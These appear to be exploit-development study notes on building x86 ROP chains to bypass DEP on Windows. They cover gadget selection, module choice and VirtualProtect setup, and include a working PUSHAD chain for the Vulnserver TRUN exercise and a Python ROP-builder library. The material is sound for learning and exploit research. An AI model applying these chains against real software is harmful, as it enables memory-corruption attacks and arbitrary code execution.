## General ROP strategy
For the below, I have not labelled gadgets with specific destinations or root registers, as any combination (including the same register for both) can be useful. 

First,

	- Identify which functions are available that allow for easy DEP bypass (eg 
	   `VirtualProtect` or `VirtualAlloc`) and set up a skeleton for them.

Then, 

	- Identify if there are any useable `pushad` instructions as this makes the set up a 
	    lot easier if we can get full register control.
	- If there is no useable `pushad` or cannot get full register control, we will likely
	    want to make use of arb-read/write gadgets with reference to `esp` as a means of 
	    fixing up the stack in the same way
	- Note: A gadget like `push e.. ; push e.. ; push e.. ; push e.. ; call e..` where all
	    registers are different can be used instead of pushad

Now we know what sort of gadgets we are looking for. Next,

	- Try to fill out the skeleton with as many trivial gadgets as possible. We prefer 
	   gadgets which are proceeded by `ret`, however `retn` and even `leave` are still 
	  somewhat easy to deal with.

If this does not fill every single gadget, we need to be able to propagate register control to be able to construct the required primitives. Identify basic gadgets for:

	Register Control (and Propagation):

		- `pop reg32`
		- `mov reg32, reg32`
		- `xchg reg32, reg32` (if no `mov` available for target)
		- `push reg32 ; pop reg32`

	Utility:

		- `push reg32`
		- `xor reg32, reg32` (can be used to clear or swap)
		- `neg reg32`
		- `mov reg32, [reg32]` (ideally the same register as a deref gadget for
		    addresses)
		- `s(hr/hl/ar/al) reg32` (if we cannot get a negated value in to the desired
		   register, as that calculation is easier)
		- `add reg32, reg32` (use either for cleaning up shifts, or for propagating to xor'd
		    registers)

The above are the simplest gadgets to use. If we still cannot fully complete the skeleton chain, look for more difficult gadgets in order:

	- `mov [reg32], reg32` (arb-write, use with pointer to data section for storage)
	- More `mov reg32, [reg32]` (arb-read, use in conjunction with arb-write for register 
	   control propagation)
	- `imul reg32, reg32` Can be used as a control propagation gadget, less simple
	- `push reg32 ; call reg32` (sequence with a `pop reg32` in the called register to get 
	    a `push; pop;`)
	- Other COP
	- Other JOP

Now we have exhausted simple gadgets, or maybe we chose some gadgets with manageable side-effects. Either way, we must find gadgets that negate any bad side effects:

	- If we have a gadget that dereferences `reg32a`, to avoid access violations, you can 
	   pop a valid address in to `reg32a` prior
	- If we have a gadget performing mathematical operations against `reg32a`, we can make 
	   efforts to get `0x0` in to `reg32a` so that the operations are transparent for  
	   control propagation
	- If we are using a gadget which has a side effect dependant on `cl` or similar, we
	    can use gadgets like `clc` to ensure that these side effects are transparent
	- If we have a gadget performing a mathematical operation with a constant, we could try
	   to find a gadget which does the inverse
	- If there are no suitable gadgets to get esp directly, you can find a `pop reg32a ; 
	    call reg32b ;` and pair it with a `push reg32a ; ret` to get roughly the current 
	    eip, which will be a local offset in to the stack. Pair this with arbwrite to set up 
	    function calls. Very easy to find gadgets for this.

Also consider when constrained: for any values we need, can we cheese it by locating a non-writeable address within a know address range which we can read from that points to the required value.
## Module Selection
When selecting modules from which to try and identify gadgets, some features are very useful. Don't forget that you can use gadgets from more than one module to build a chain.

| Feature    | Priority | Notes |
| -------- | ------- | --- |
| No intrinsic badchars  | Highest Priority| Some modules will always have badchars present eg a base of `0x00400000`|
| No protections  | Highest Priority| Gadgets in here are most likely to be useable|
| Static Base | Highest Priority     | Even if ASLR is off, some module bases may be relocated due preferred base collisions|
| No ASLR    | High Priority    | This module is more likely to have a static base | 
| Module is included with software| High Priority    | Better portability  |
| Module is large| Medium Priority    | This module is more likely to have useable gadgets |
| Module is old| Medium Priority    | This module is less likely to have compiler settings that strip useful gadgets |
| No SEH protections    | Low Priority (if not SEH exploitation)| Sometimes it can be useful to be able to register an SEH handler, or with SEH exploitation |
## Run rp++
```powershell
$f=Get-Item .\csftpav6.dll ; $of = $f.Basename + $f.Extension + "_gadgets.txt" ; if (Test-Path $of) {Remove-item $of} ; rp++ --file $f -r 5 --va 0 > $of
```
## Functions to call
### VirtualProtect
```c
BOOL VirtualProtect(
  [in]  LPVOID lpAddress,
  [in]  SIZE_T dwSize,
  [in]  DWORD  flNewProtect,
  [out] PDWORD lpflOldProtect
);
```
### VirtualAlloc
```c
LPVOID VirtualAlloc(
  [in, optional] LPVOID lpAddress,
  [in]           SIZE_T dwSize,
  [in]           DWORD  flAllocationType,
  [in]           DWORD  flProtect
);
```
### WriteProcessMemory
```c
BOOL WriteProcessMemory(
  [in]  HANDLE  hProcess,
  [in]  LPVOID  lpBaseAddress,
  [in]  LPCVOID lpBuffer,
  [in]  SIZE_T  nSize,
  [out] SIZE_T  *lpNumberOfBytesWritten
);
```
## Using gadgets without a simple ret ending
Avoid at all costs, but if you need to use them then...
(may not be 100% correct, but should be close enough to get the gist)

For `retn x`:
```python
buf += p32(gadget1)    # gadget with "retn 4" ending
buf += p32(gadget2)    # gadget1 returns here
buf += p32(0xFFFFFFFF) # 4 bytes of junk skipped over because the +4 kicks in here
buf += p32(gadget3)    # gadget2 returns here
```
or
```python
buf += p32(gadget1)    # pop reg32
buf += p32(gadget2)    # x
buf += p32(0xFFFFFFFF) # gadget with "retn x" ending
buf += p32(gadget3)    # sub esp, reg32
```

For `leave ; ret`:
```python
buf += p32(gadget1)    # mov ebp, esp ;
buf += p32(gadget2)    # Gadget with "leave ; ret ;" ending
buf += p32(0xFFFFFFFF) # Junk for pop ebp ;
buf += p32(gadget3)    # gadget 3 returns here and stack is ok
```

For `call reg32`:
```python
buf += p32(gadget1)    # pop reg32 ;
buf += p32(gadget3)    # gadget2 returns here (may want to use a pure "ret" to avoid messing up stack)
buf += p32(gadget2)    # Gadget with "call reg32" ending
buf += p32(gadget4)    # gadget3 returns here
```

For `call [reg32]`:
```python
buf += p32(gadget1)    # mov reg32_a, esp;
buf += p32(gadget2)    # add reg32_a, 0x0c;
buf += p32(gadget3)    # pop reg32_b; (we do this so that the raw address is skipped)
buf += p32(gadget5)    # gadget4 returns here, requires pop ; ret ; ending (may want to use a pure "pop; ret" to avoid messing up stack)
buf += p32(gadget4)    # Gadget with "call [reg32_a]" ending
buf += p32(gadget6)    # gadget5 returns here
``````

For `jmp reg32`:
```python
buf += p32(gadget1)    # pop reg32 ;
buf += p32(gadget3)    # gadget two jumps here (may want to use a pure "ret" to avoid messing up stack)
buf += p32(gadget2)    # Gadget with "jmp reg32" ending
buf += p32(gadget4)    # gadget3 returns here
```

For `jmp [reg32]`:
```python
buf += p32(gadget1)    # mov reg32_a, esp;
buf += p32(gadget2)    # add reg32_a, 0x0c;
buf += p32(gadget3)    # pop reg32_b; (we do this so that the raw address is skipped)
buf += p32(gadget5)    # gadget4 returns here (may want to use a pure "ret" to avoid messing up stack)
buf += p32(gadget4)    # Gadget with "jmp [reg32]" ending
buf += p32(gadget6)    # gadget5 returns here
```
## VirtualProtect PUSHAD Chain Example
What happens when PUSHAD is called
```python
IF 64-bit Mode
    THEN #UD
FI;
IF OperandSize = 32 (* PUSHAD instruction *)
    THEN
        Temp := (ESP);
        Push(EAX);               # jmp_esp lands here, so some NOP equivalent
        Push(ECX);               # lpflOldProtect (just has to be writeable)
        Push(EDX);               # flNewProtect
        Push(EBX);               # dwSize
        Push(Temp); # old esp    # lpAddress
        Push(EBP);               # jmp_esp gadget
        Push(ESI);               # VirtualProtect
        Push(EDI);               # ret
    ELSE (* OperandSize = 16, PUSHA instruction *)
        Temp := (SP);
        Push(AX);
        Push(CX);
        Push(DX);
        Push(BX);
        Push(Temp);
        Push(BP);
        Push(SI);
        Push(DI);
FI;
```
Constructing a chain from it: 
![[pushad ROP.png]]

Vulnserver TRUN example by mona:
```python
virtual_protect_chain = [
	0x76e83b80,  # POP ECX # RETN [RPCRT4.dll] ** REBASED ** ASLR 
	0x6250609c,  # ptr to &VirtualProtect() [IAT essfunc.dll]
	0x76a0fd52,  # MOV ESI,DWORD PTR DS:[ECX] # ADD DH,DH # RETN [MSCTF.dll]
	
	0x7719054d,  # POP EBP # RETN [msvcrt.dll] ** REBASED ** ASLR 
	0x625011af,  # & jmp esp [essfunc.dll]
	0x76e90990,  # POP EAX # RETN [RPCRT4.dll] ** REBASED ** ASLR 
	0xfffffdff,  # Value to negate, will become 0x00000200
	0x769f2fd0,  # NEG EAX # RETN [MSCTF.dll] ** REBASED ** ASLR 
	0x76a0f9f1,  # XCHG EAX,EBX # RETN [MSCTF.dll] ** REBASED ** ASLR 
	0x77185da8,  # POP EAX # RETN [msvcrt.dll] ** REBASED ** ASLR 
	0xffffffc0,  # Value to negate, will become 0x00000040
	0x76a14cbd,  # NEG EAX # RETN [MSCTF.dll] ** REBASED ** ASLR 
	0x77216d70,  # XCHG EAX,EDX # RETN [ntdll.dll] ** REBASED ** ASLR 
	0x771a8cc6,  # POP ECX # RETN [msvcrt.dll] ** REBASED ** ASLR 
	0x7660cb49,  # &Writable location [USP10.dll] ** REBASED ** ASLR
	0x77160a31,  # POP EDI # RETN [msvcrt.dll] ** REBASED ** ASLR 
	0x76e21645,  # RETN (ROP NOP) [RPCRT4.dll] ** REBASED ** ASLR
	0x7727a30c,  # POP EAX # RETN [ntdll.dll] ** REBASED ** ASLR 
	0x90909090,  # nop
	0x7707e180,  # PUSHAD # RETN [kernel32.dll] ** REBASED ** ASLR 
]
```

Ready to construct VirtualProtect:
```python
class Addresses(object):
	pop_ecx =
	VirtualProtect_addr =
	mov_esi_ptr_ecx =
	pop_ebp =
	jmp_esp =
	pop_eax =
	neg_eax =
	xchg_eax_ebx =
	xchg_eax_edx = 
	p_writeable = 
	pop_edi =
	ret = 
	pushad = 
	
virtual_protect_chain = [
	Addresses.pop_ecx,
	Addresses.VirtualProtect_addr,
	Addresses.mov_esi_ptr_ecx,
	Addresses.pop_ebp,
	Addresses.jmp_esp,
	Addresses.pop_eax,
	0xfffffdff,
	Addresses.neg_eax,
	Addresses.xchg_eax_ebx,
	Addresses.pop_eax,
	0xffffffc0,
	Addresses.neg_eax,
	Addresses.xchg_eax_edx,
	Addresses.pop_ecx,
	Addresses.p_writeable,
	Addresses.pop_edi,
	Addresses.ret,
	Addresses.pop_eax,
	0x90909090,
	Addresses.pushad
]
```

or:
## ROP Helper Lib
Makes writing custom ROP chains quicker and easier to read, doesn't attempt to generate one from scratch.

```python
def p32(x):
    return struct.pack('<I', x)

def u32(x):
    return struct.unpack('<I', x)

# ROP helper library
def get_virt_base(virt_addr, offset):
    return virt_addr - offset


class Gadget(object):
    def __init__(self, gname, offset):
        self.gname = gname
        self.offset = offset


class GadgetResolver(object):  
    def __init__(self, base):
        self.base = base
        self.gadgets = {}
        
    def add_gadget(self, gadget: Gadget):
        self.gadgets[gadget.gname] = gadget.offset
        
    def add_gadgets(self, *gadgets: Gadget):
        for gadget in gadgets:
            self.add_gadget(gadget)

    def get_gadget(self, gname):
        return self.gadgets[gname] + self.base
        
    def resolve_all(self):
        return {k:self.get_gadget(k) for k, _ in self.gadgets.items()}


class ROPBuilder():
    def __init__(self, *gadget_pools: GadgetResolver):
    
        self.gadgets = {}
        for pool in gadget_pools:
            self.gadgets.update(pool.resolve_all())

    def get_chain_array(self, *chain: Union[str,int]) -> List[int]:
    
        o_chain = []
        
        for item in chain:
            if type(item) is str:
                if item not in self.gadgets:
                    raise ValueError(
	                    f"Can't find gadget, please add it first('{item}')"
                    )
                o_chain.append(self.gadgets[item])
            elif type(item) is int:
                o_chain.append(item)
            else:
                raise ValueError("Gadget value invalid, should be either str or int")
                
        self.chain_labels = []
        
        # Get labels for every item in the chain
        const_count = 0
        for label in chain:
            if type(label) is int:
                self.chain_labels.append(f"const_{const_count}")
                const_count += 1
            else:
                self.chain_labels.append(label)
        self.chain_array = o_chain
        
        return o_chain

    def get_chain_buffer(self, *chain:Union[str,int]) -> bytes:
    
        if not self.chain_array:
            if len(chain) == 0:
                raise ValueError("Must provide raw chain if not already resolved")
            self.get_chain_array(chain)
            
        return b"".join([p32(item) for item in self.chain_array])
  
    def get_chain_tuple(self):
        return zip(self.chain_labels, self.chain_array)
```
